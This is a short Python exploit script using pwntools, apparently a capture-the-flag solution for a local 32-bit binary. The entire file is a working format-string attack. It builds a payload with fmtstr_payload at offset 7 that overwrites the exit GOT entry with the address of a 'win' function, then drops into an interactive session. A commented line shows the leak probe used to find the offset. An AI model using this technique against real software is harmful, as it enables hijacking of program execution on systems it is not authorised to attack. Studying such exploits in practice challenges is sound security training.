#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            
            """)
    elif cond == 3:
        r = remote("addr", 1337)

    return r


def main():
    r = conn(1)

    addrWin = 0x0804849b
    addrExitGot = 0x804a018

    # r.send(b"A"*0x4 + b".%08x"*10)
    offset = 7

    payload = fmtstr_payload(offset, {addrExitGot: addrWin})

    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()